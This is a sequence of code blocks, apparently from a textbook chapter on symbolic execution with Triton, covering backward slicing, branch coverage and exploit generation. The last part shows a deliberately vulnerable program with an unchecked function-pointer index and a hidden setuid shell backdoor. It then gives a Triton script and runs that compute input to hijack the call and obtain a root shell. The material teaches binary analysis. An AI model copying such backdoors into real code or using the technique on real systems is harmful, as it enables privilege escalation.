["```\nshr eax,cl\nxor eax,0x1\nand eax,0x1\n```", "```\n  $ objdump -M intel -d /bin/ls\n\n  ...\n  404b00:  49 89 cb           mov    r11,rcx\n  404b03:  48 8b 0f           mov    rcx,QWORD PTR [rdi]\n  404b06:  48 8b 06           mov    rax,QWORD PTR [rsi]\n  404b09:  41 56              push   r14\n  404b0b:  41 55              push   r13\n  404b0d:  41 ba 01 00 00 00  mov    r10d,0x1\n  404b13:  41 54              push   r12\n  404b15:  55                 push   rbp\n  404b16:  4c 8d 41 01        lea    r8,[rcx+0x1]\n  404b1a:  48 f7 d1           not    rcx\n  404b1d:  53                 push   rbx\n➊ 404b1e:  49 89 c9          mov    r9,rcx\n  ...\n```", "```\n404b03: mov rcx,QWORD PTR [rdi]\n404b1a: not rcx\n404b1e: mov r9,rcx\n```", "```\n➊ #include \"../inc/loader.h\"\n  #include \"triton_util.h\"\n  #include \"disasm_util.h\"\n\n  #include <triton/api.hpp>\n  #include <triton/x86Specifications.hpp>\n\n  int\n  main(int argc, char *argv[])\n  {\n    Binary bin;\n    triton::API api;\n    triton::arch::registers_e ip;\n    std::map<triton::arch::registers_e, uint64_t> regs;\n    std::map<uint64_t, uint8_t> mem;\n\n    if(argc < 6) {\n      printf(\"Usage: %s <binary> <sym-config> <entry> <slice-addr> <reg>\\n\", argv[0]);\n      return 1;\n    }\n\n    std::string fname(argv[1]);\n    if(load_binary(fname, &bin, Binary::BIN_TYPE_AUTO) < 0) return 1;\n\n➋   if(set_triton_arch(bin, api, ip) < 0) return 1;\n     api.enableMode(triton::modes::ALIGNED_MEMORY, true);\n\n➌   if(parse_sym_config(argv[2], &regs, &mem) < 0) return 1;\n     for(auto &kv: regs) {\n       triton::arch::Register r = api.getRegister(kv.first);\n       api.setConcreteRegisterValue(r, kv.second);\n     }\n     for(auto &kv: mem) {\n       api.setConcreteMemoryValue(kv.first, kv.second);\n     }\n\n     uint64_t pc         = strtoul(argv[3], NULL, 0);\n     uint64_t slice_addr = strtoul(argv[4], NULL, 0);\n     Section *sec = bin.get_text_section();\n\n➍   while(sec->contains(pc)) {\n       char mnemonic[32], operands[200];\n➎     int len = disasm_one(sec, pc, mnemonic, operands);\n       if(len <= 0) return 1;\n\n➏     triton::arch::Instruction insn;\n       insn.setOpcode(sec->bytes+(pc-sec->vma), len);\n       insn.setAddress(pc);\n\n➐     api.processing(insn);\n\n➑     for(auto &se: insn.symbolicExpressions) {\n         std::string comment = mnemonic; comment += \" \"; comment += operands;\n         se->setComment(comment);\n       }\n\n➒     if(pc == slice_addr) {\n         print_slice(api, sec, slice_addr, get_triton_regnum(argv[5]), argv[5]);\n         break;\n       }\n\n➓     pc = (uint64_t)api.getConcreteRegisterValue(api.getRegister(ip));\n     }\n\n     unload_binary(&bin);\n\n     return 0;\n   }\n```", "```\n%rax=0\n%rax=$\n@0x1000=5\n```", "```\n  static int\n  set_triton_arch(Binary &bin, triton::API &api, triton::arch::registers_e &ip)\n  {\n➊   if(bin.arch != Binary::BinaryArch::ARCH_X86) {\n       fprintf(stderr, \"Unsupported architecture\\n\");\n       return -1;\n     }\n\n➋   if(bin.bits == 32) {\n➌     api.setArchitecture(triton::arch::ARCH_X86);\n➍     ip = triton::arch::ID_REG_EIP;\n     } else if(bin.bits == 64) {\n➎     api.setArchitecture(triton::arch::ARCH_X86_64);\n➏     ip = triton::arch::ID_REG_RIP;\n\n } else {\n      fprintf(stderr, \"Unsupported bit width for x86: %u bits\\n\", bin.bits);\n      return -1;\n    }\n\n    return 0;\n }\n```", "```\n   static void\n   print_slice(triton::API &api, Section *sec, uint64_t slice_addr,\n               triton::arch::registers_e reg, const char *regname)\n   {\n     triton::engines::symbolic::SymbolicExpression *regExpr;\n     std::map<triton::usize, triton::engines::symbolic::SymbolicExpression*> slice;\n     char mnemonic[32], operands[200];\n\n➊    regExpr = api.getSymbolicRegisters()[reg];\n➋    slice = api.sliceExpressions(regExpr);\n\n➌    for(auto &kv: slice) {\n        printf(\"%s\\n\", kv.second->getComment().c_str());\n     }\n➍   disasm_one(sec, slice_addr, mnemonic, operands);\n     std::string target = mnemonic; target += \" \"; target += operands;\n\n     printf(\"(slice for %s @ 0x%jx: %s)\\n\", regname, slice_addr, target.c_str());\n  }\n```", "```\n➊ $ ./backward_slicing /bin/ls empty.map 0x404b00 0x404b1e rcx\n➋ mov rcx, qword ptr [rdi]\n  not rcx\n  (slice for rcx @ 0x404b1e: mov r9, rcx)\n```", "```\n   #include \"../inc/loader.h\"\n   #include \"triton_util.h\"\n   #include \"disasm_util.h\"\n\n   #include <triton/api.hpp>\n   #include <triton/x86Specifications.hpp>\n\n   int\n   main(int argc, char *argv[])\n   {\n     Binary bin;\n     triton::API api;\n     triton::arch::registers_e ip;\n     std::map<triton::arch::registers_e, uint64_t> regs;\n     std::map<uint64_t, uint8_t> mem;\n     std::vector<triton::arch::registers_e> symregs;\n     std::vector<uint64_t> symmem;\n\n     if(argc < 5) {\n       printf(\"Usage: %s <binary> <sym-config> <entry> <branch-addr>\\n\", argv[0]);\n       return 1;\n   }\n\n   std::string fname(argv[1]);\n   if(load_binary(fname, &bin, Binary::BIN_TYPE_AUTO) < 0) return 1;\n\n   if(set_triton_arch(bin, api, ip) < 0) return 1;\n   api.enableMode(triton::modes::ALIGNED_MEMORY, true);\n\n➊  if(parse_sym_config(argv[2], &regs, &mem, &symregs, &symmem) < 0) return 1;\n    for(auto &kv: regs) {\n      triton::arch::Register r = api.getRegister(kv.first);\n      api.setConcreteRegisterValue(r, kv.second);\n   }\n➋  for(auto regid: symregs) {\n     triton::arch::Register r = api.getRegister(regid);\n     api.convertRegisterToSymbolicVariable(r)->setComment(r.getName());\n   }\n   for(auto &kv: mem) {\n     api.setConcreteMemoryValue(kv.first, kv.second);\n   }\n➌  for(auto memaddr: symmem) {\n     api.convertMemoryToSymbolicVariable(\n         triton::arch::MemoryAccess(memaddr, 1))->setComment(std::to_string(memaddr));\n   }\n\n    uint64_t pc          = strtoul(argv[3], NULL, 0);\n    uint64_t branch_addr = strtoul(argv[4], NULL, 0);\n    Section *sec = bin.get_text_section();\n\n➍  while(sec->contains(pc)) {\n      char mnemonic[32], operands[200];\n      int len = disasm_one(sec, pc, mnemonic, operands);\n      if(len <= 0) return 1;\n\n      triton::arch::Instruction insn;\n      insn.setOpcode(sec->bytes+(pc-sec->vma), len);\n      insn.setAddress(pc);\n\n      api.processing(insn);\n\n➎    if(pc == branch_addr) {\n        find_new_input(api, sec, branch_addr);\n        break;\n      }\n\n      pc = (uint64_t)api.getConcreteRegisterValue(api.getRegister(ip));\n    }\n\n    unload_binary(&bin);\n\n    return 0;\n  }\n```", "```\n   static void\n   find_new_input(triton::API &api, Section *sec, uint64_t branch_addr)\n   {\n➊   triton::ast::AstContext &ast = api.getAstContext();\n➋   triton::ast::AbstractNode *constraint_list = ast.equal(ast.bvtrue(), ast.bvtrue());\n\n     printf(\"evaluating branch 0x%jx:\\n\", branch_addr);\n\n➌   const std::vector<triton::engines::symbolic::PathConstraint> &path_constraints\n         = api.getPathConstraints();\n➍   for(auto &pc: path_constraints) {\n➎     if(!pc.isMultipleBranches()) continue;\n➏     for(auto &branch_constraint: pc.getBranchConstraints()) {\n        bool flag         = std::get<0>(branch_constraint);\n        uint64_t src_addr = std::get<1>(branch_constraint);\n        uint64_t dst_addr = std::get<2>(branch_constraint);\n        triton::ast::AbstractNode *constraint = std::get<3>(branch_constraint);\n\n➐      if(src_addr != branch_addr) {\n          /* this is not our target branch, so keep the existing \"true\" constraint */\n➑        if(flag) {\n            constraint_list = ast.land(constraint_list, constraint);\n         }\n➒     } else {\n        /* this is our target branch, compute new input */\n        printf(\"    0x%jx -> 0x%jx (%staken)\\n\",\n               src_addr, dst_addr, flag ? \"\" : \"not \");\n\n➓      if(!flag) {\n          printf(\"    computing new input for 0x%jx -> 0x%jx\\n\",\n                src_addr, dst_addr);\n          constraint_list = ast.land(constraint_list, constraint);\n          for(auto &kv: api.getModel(constraint_list)) {\n            printf(\"      SymVar %u (%s) = 0x%jx\\n\",\n                  kv.first,\n                  api.getSymbolicVariableFromId(kv.first)->getComment().c_str(),\n                  (uint64_t)kv.second.getValue());\n          }\n        }\n      }\n    }\n  }\n}\n```", "```\n4055dc:       3c 25                    cmp     al,0x25\n 4055de:       0f 8d f4 00 00 00        jge     4056d8\n```", "```\n   #include <stdio.h>\n   #include <stdlib.h>\n\n   void\n   branch(int x, int y)\n   {\n➊   if(x < 5) {\n➋     if(y == 10) printf(\"x < 5 && y == 10\\n\");\n       else        printf(\"x < 5 && y != 10\\n\");\n     } else {\n       printf(\"x >= 5\\n\");\n     }\n   }\n\n   int\n   main(int argc, char *argv[])\n   {\n     if(argc < 3) {\n       printf(\"Usage: %s <x> <y>\\n\", argv[0]);\n       return 1;\n     }\n\n➌   branch(strtol(argv[1], NULL, 0), strtol(argv[2], NULL, 0));\n\n     return 0;\n   }\n```", "```\n   $ objdump -M intel -d ./branch\n   ...\n   00000000004005b6 <branch>:\n     4005b6:  55               push   rbp\n     4005b7:  48 89 e5         mov    rbp,rsp\n     4005ba:  48 83 ec 10      sub    rsp,0x10\n➊   4005be:  89 7d fc         mov    DWORD PTR [rbp-0x4],edi\n➋   4005c1:  89 75 f8         mov    DWORD PTR [rbp-0x8],esi\n➌   4005c4:  83 7d fc 04      cmp    DWORD PTR [rbp-0x4],0x4\n➍   4005c8:  7f 1e            jg     4005e8 <branch+0x32>\n➎   4005ca:  83 7d f8 0a      cmp    DWORD PTR [rbp-0x8],0xa\n➏   4005ce:  75 0c            jne    4005dc <branch+0x26>\n     4005d0:  bf 04 07 40 00   mov    edi,0x400704\n     4005d5:  e8 96 fe ff ff   call   400470 <puts@plt>\n     4005da:  eb 16            jmp    4005f2 <branch+0x3c>\n     4005dc:  bf 15 07 40 00   mov    edi,0x400715\n     4005e1:  e8 8a fe ff ff   call   400470 <puts@plt>\n     4005e6:  eb 0a            jmp    4005f2 <branch+0x3c>\n     4005e8:  bf 26 07 40 00   mov    edi,0x400726\n     4005ed:  e8 7e fe ff ff   call   400470 <puts@plt>\n     4005f2:  c9               leave\n     4005f3:  c3               ret\n   ...\n```", "```\n➊ %rdi=$\n  %rdi=0\n➋ %rsi=$\n  %rsi=0\n```", "```\n$ ./branch 0 0\nx < 5 && y != 10\n```", "```\n➊ $ ./code_coverage branch branch.map 0x4005b6 0x4005ce\n   evaluating branch 0x4005ce:\n➋      0x4005ce -> 0x4005dc (taken)\n➌      0x4005ce -> 0x4005d0 (not taken)\n➍      computing new input for 0x4005ce -> 0x4005d0\n➎        SymVar 0 (rdi) = 0x0\n          SymVar 1 (rsi) = 0xa\n```", "```\n$ ./branch 0 0xa\nx < 5 && y == 10\n```", "```\n   #include <stdio.h>\n   #include <stdlib.h>\n   #include <string.h>\n   #include <unistd.h>\n   #include <crypt.h>\n\n   void forward (char *hash);\n   void reverse (char *hash);\n   void hash    (char *src, char *dst);\n\n➊ static struct {\n     void (*functions[2])(char *);\n     char hash[5];\n   } icall;\n\n   int\n   main(int argc, char *argv[])\n   {\n     unsigned i;\n\n➋   icall.functions[0] = forward;\n     icall.functions[1] = reverse;\n\n     if(argc < 3) {\n       printf(\"Usage: %s <index> <string>\\n\", argv[0]);\n       return 1;\n     }\n\n➌    if(argc > 3 && !strcmp(crypt(argv[3], \"$1$foobar\"), \"$1$foobar$Zd2XnPvN/dJVOseI5/5Cy1\")) {\n        /* secret admin area */\n        if(setgid(getegid())) perror(\"setgid\");\n        if(setuid(geteuid())) perror(\"setuid\");\n        execl(\"/bin/sh\", \"/bin/sh\", (char*)NULL);\n➍    } else {\n➎      hash(argv[2], icall.hash);\n➏      i = strtoul(argv[1], NULL, 0);\n\n        printf(\"Calling %p\\n\", (void*)icall.functions[i]);\n➐      icall.functions[i](icall.hash);\n     }\n\n     return 0;\n   }\n\n   void\n   forward(char *hash)\n   {\n     int i;\n\n     printf(\"forward: \");\n     for(i = 0; i < 4; i++) {\n       printf(\"%02x\", hash[i]);\n    }\n    printf(\"\\n\");\n   }\n\n   void\n   reverse(char *hash)\n   {\n     int i;\n\n     printf(\"reverse: \");\n     for(i = 3; i >= 0; i--) {\n       printf(\"%02x\", hash[i]);\n     }\n     printf(\"\\n\");\n   }\n\n   void\n   hash(char *src, char *dst)\n   {\n     int i, j;\n\n     for(i = 0; i < 4; i++) {\n       dst[i] = 31 + (char)i;\n       for(j = i; j < strlen(src); j += 4) {\n         dst[i] ˆ= src[j] + (char)j;\n         if(i > 1) dst[i] ˆ= dst[i-2];\n       }\n     }\n     dst[4] = '\\0';\n   }\n```", "```\n➊ $ ./icall 1 foo\n➋ Calling 0x400974\n➌ reverse: 22295079\n```", "```\n   $ ./icall 2 foo\n➊ Calling 0x22295079\n➋ Segmentation fault (core dumped)\n```", "```\n   0000000000400abe <main>:\n     400abe:  55                    push   rbp\n     400abf:  48 89 e5              mov    rbp,rsp\n     400ac2:  48 83 ec 20           sub    rsp,0x20\n     400ac6:  89 7d ec              mov    DWORD PTR [rbp-0x14],edi\n     400ac9:  48 89 75 e0           mov    QWORD PTR [rbp-0x20],rsi\n     400acd:  48 c7 05 c8 15 20 00  mov    QWORD PTR [rip+0x2015c8],0x400916\n     400ad4:  16 09 40 00\n     400ad8:  48 c7 05 c5 15 20 00  mov    QWORD PTR [rip+0x2015c5],0x400974\n     400adf:  74 09 40 00\n     400ae3:  83 7d ec 02           cmp    DWORD PTR [rbp-0x14],0x2\n     400ae7:  7f 23                 jg     400b0c <main+0x4e>\n     400ae9:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]\n     400aed:  48 8b 00              mov    rax,QWORD PTR [rax]\n     400af0:  48 89 c6              mov    rsi,rax\n     400af3:  bf a1 0c 40 00        mov    edi,0x400ca1\n     400af8:  b8 00 00 00 00        mov    eax,0x0\n     400afd:  e8 5e fc ff ff        call   400760 <printf@plt>\n     400b02:  b8 01 00 00 00        mov    eax,0x1\n     400b07:  e9 ea 00 00 00        jmp    400bf6 <main+0x138>\n     400b0c:  83 7d ec 03           cmp    DWORD PTR [rbp-0x14],0x3\n     400b10:  7e 78                 jle    400b8a <main+0xcc>\n     400b12:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]\n     400b16:  48 83 c0 18           add    rax,0x18\n     400b1a:  48 8b 00              mov    rax,QWORD PTR [rax]\n     400b1d:  be bd 0c 40 00        mov    esi,0x400cbd\n     400b22:  48 89 c7              mov    rdi,rax\n     400b25:  e8 56 fc ff ff        call   400780 <crypt@plt>\n     400b2a:  be c8 0c 40 00        mov    esi,0x400cc8\n     400b2f:  48 89 c7              mov    rdi,rax\n     400b32:  e8 69 fc ff ff        call   4007a0 <strcmp@plt>\n     400b37:  85 c0                 test   eax,eax\n     400b39:  75 4f                 jne    400b8a <main+0xcc>\n➊   400b3b:  e8 70 fc ff ff        call   4007b0 <getegid@plt>\n     400b40:  89 c7                 mov    edi,eax\n➋   400b42:  e8 79 fc ff ff        call   4007c0 <setgid@plt>\n     400b47:  85 c0                 test   eax,eax\n     400b49:  74 0a                 je     400b55 <main+0x97>\n     400b4b:  bf e9 0c 40 00        mov    edi,0x400ce9\n     400b50:  e8 7b fc ff ff        call   4007d0 <perror@plt>\n     400b55:  e8 16 fc ff ff        call   400770 <geteuid@plt>\n     400b5a:  89 c7                 mov    edi,eax\n➌   400b5c:  e8 8f fc ff ff        call   4007f0 <setuid@plt>\n     400b61:  85 c0                 test   eax,eax\n     400b63:  74 0a                 je     400b6f <main+0xb1>\n     400b65:  bf f0 0c 40 00        mov    edi,0x400cf0\n     400b6a:  e8 61 fc ff ff        call   4007d0 <perror@plt>\n     400b6f:  ba 00 00 00 00        mov    edx,0x0\n     400b74:  be f7 0c 40 00        mov    esi,0x400cf7\n     400b79:  bf f7 0c 40 00        mov    edi,0x400cf7\n     400b7e:  b8 00 00 00 00        mov    eax,0x0\n➍   400b83:  e8 78 fc ff ff        call   400800 <execl@plt>\n     400b88:  eb 67                 jmp    400bf1 <main+0x133>\n     400b8a:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]\n     400b8e:  48 83 c0 10           add    rax,0x10\n     400b92:  48 8b 00              mov    rax,QWORD PTR [rax]\n     400b95:  be b0 20 60 00        mov    esi,0x6020b0\n     400b9a:  48 89 c7              mov    rdi,rax\n     400b9d:  e8 30 fe ff ff        call   4009d2 <hash>\n     400ba2:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]\n     400ba6:  48 83 c0 08           add    rax,0x8\n     400baa:  48 8b 00              mov    rax,QWORD PTR [rax]\n     400bad:  ba 00 00 00 00        mov    edx,0x0\n     400bb2:  be 00 00 00 00        mov    esi,0x0\n     400bb7:  48 89 c7              mov    rdi,rax\n     400bba:  e8 21 fc ff ff        call   4007e0 <strtoul@plt>\n     400bbf:  89 45 fc              mov    DWORD PTR [rbp-0x4],eax\n     400bc2:  8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]\n     400bc5:  48 8b 04 c5 a0 20 60  mov    rax,QWORD PTR [rax*8+0x6020a0]\n     400bcc:  00      \n     400bcd:  48 89 c6              mov    rsi,rax\n     400bd0:  bf ff 0c 40 00        mov    edi,0x400cff\n     400bd5:  b8 00 00 00 00        mov    eax,0x0\n     400bda:  e8 81 fb ff ff        call   400760 <printf@plt>\n     400bdf:  8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]\n     400be2:  48 8b 04 c5 a0 20 60  mov    rax,QWORD PTR [rax*8+0x6020a0]\n     400be9:  00\n     400bea:  bf b0 20 60 00        mov    edi,0x6020b0\n➎   400bef: ff d0                  call   rax\n     400bf1:  b8 00 00 00 00        mov    eax,0x0\n     400bf6:  c9                    leave\n     400bf7:  c3                    ret\n     400bf8:  0f 1f 84 00 00 00 00  nop    DWORD PTR [rax+rax*1+0x0]\n     400bff:  00\n```", "```\n   #!/usr/bin/env python2\n   ## -*- coding: utf-8 -*-\n\n➊ import triton\n   import pintool\n\n➋ taintedCallsite = 0x400bef # Found in a previous DTA pass\n   target          = 0x400b3b # Target to redirect callsite to\n\n➌ Triton = pintool.getTritonContext()\n\n   def main():\n➍     Triton.setArchitecture(triton.ARCH.X86_64)\n       Triton.enableMode(triton.MODE.ALIGNED_MEMORY, True)\n\n➎     pintool.startAnalysisFromSymbol('main')\n\n➏     pintool.insertCall(symbolize_inputs, pintool.INSERT_POINT.ROUTINE_ENTRY, 'main')\n➐     pintool.insertCall(hook_icall, pintool.INSERT_POINT.BEFORE)\n\n➑     pintool.runProgram()\n\n   if __name__ == '__main__':\n       main()\n```", "```\n   def symbolize_inputs(tid):\n➊     rdi = pintool.getCurrentRegisterValue(Triton.registers.rdi) # argc\n       rsi = pintool.getCurrentRegisterValue(Triton.registers.rsi) # argv\n\n       # for each string in argv\n➋     while rdi > 1:\n➌         addr = pintool.getCurrentMemoryValue(\n           rsi + ((rdi-1)*triton.CPUSIZE.QWORD),\n triton.CPUSIZE.QWORD)\n       # symbolize current argument string (including terminating NULL)\n       c = None\n       s = ''\n➍     while c != 0:\n➎         c = pintool.getCurrentMemoryValue(addr)\n           s += chr(c)\n➏         Triton.setConcreteMemoryValue(addr, c)\n➐         Triton.convertMemoryToSymbolicVariable(\n                   triton.MemoryAccess(addr, triton.CPUSIZE.BYTE)\n               ).setComment('argv[%d][%d]' % (rdi-1, len(s)-1))\n           addr += 1\n       rdi -= 1\n       print 'Symbolized argument %d: %s' % (rdi, s)\n```", "```\n   def hook_icall(insn):\n➊     if insn.isControlFlow() and insn.getAddress() == taintedCallsite:\n➋         for op in insn.getOperands():\n➌             if op.getType() == triton.OPERAND.REG:\n                  print 'Found tainted indirect call site \\'%s\\'' % (insn)\n➍                exploit_icall(insn, op)\n```", "```\n   def exploit_icall(insn, op):\n➊      regId   = Triton.getSymbolicRegisterId(op)\n➋      regExpr = Triton.unrollAst(Triton.getAstFromId(regId))\n➌      ast = Triton.getAstContext()\n\n➍      exploitExpr = ast.equal(regExpr, ast.bv(target, triton.CPUSIZE.QWORD_BIT))\n➎      for k, v in Triton.getSymbolicVariables().iteritems():\n➏          if 'argv' in v.getComment():\n               # Argument characters must be printable\n➐             argExpr = Triton.getAstFromId(k)\n➑             argExpr = ast.land([\n                             ast.bvuge(argExpr, ast.bv(32, triton.CPUSIZE.BYTE_BIT)),\n                             ast.bvule(argExpr, ast.bv(126, triton.CPUSIZE.BYTE_BIT))\n                        ])\n➒             exploitExpr = ast.land([exploitExpr, argExpr])\n\n       print 'Getting model for %s -> 0x%x' % (insn, target)\n➓     model = Triton.getModel(exploitExpr)\n      for k, v in model.iteritems():\n          print '%s (%s)' % (v, Triton.getSymbolicVariableFromId(k).getComment())\n```", "```\n➊ $ cd ~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build\n➋ $ ./triton ➌~/code/chapter13/exploit_callsite.py \\\n             ➍~/code/chapter13/icall 2 AAA\n➎ Symbolized argument 2: AAA\n   Symbolized argument 1: 2\n➏ Calling 0x223c625e\n➐ Found tainted indirect call site '0x400bef: call rax'\n➑ Getting model for 0x400bef: call rax -> 0x400b3b\n   # no model found\n```", "```\n   $ cd ~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build\n➋ $ for i in $(seq 1 100); do\n      str=`python -c \"print 'A'*\"${i}`\n      echo \"Trying input len ${i}\"\n➌    ./triton ~/code/chapter13/exploit_callsite.py ~/code/chapter13/icall 2 ${str} \\\n       | grep -a SymVar\n     done\n➍ Trying input len 1\n   Trying input len 2\n   Trying input len 3\n   Trying input len 4\n➎ SymVar_0 = 0x24 (argv[2][0])\n   SymVar_1 = 0x2A (argv[2][1])\n SymVar_2 = 0x58 (argv[2][2])\n   SymVar_3 = 0x26 (argv[2][3])\n   SymVar_4 = 0x40 (argv[2][4])\n   SymVar_5 = 0x20 (argv[1][0])\n   SymVar_6 = 0x40 (argv[1][1])\n   Trying input len 5\n➏ SymVar_0 = 0x64 (argv[2][0])\n   SymVar_1 = 0x2A (argv[2][1])\n   SymVar_2 = 0x58 (argv[2][2])\n   SymVar_3 = 0x26 (argv[2][3])\n   SymVar_4 = 0x3C (argv[2][4])\n   SymVar_5 = 0x40 (argv[2][5])\n   SymVar_6 = 0x40 (argv[1][0])\n   SymVar_7 = 0x40 (argv[1][1])\n   Trying input len 6\n   ˆC\n```", "```\n➊ $ cd ~/code/chapter13\n➋ $ ./icall 2 '$*X&'\n➌ Calling 0x400b3b\n➍ # whoami\n  root\n```"]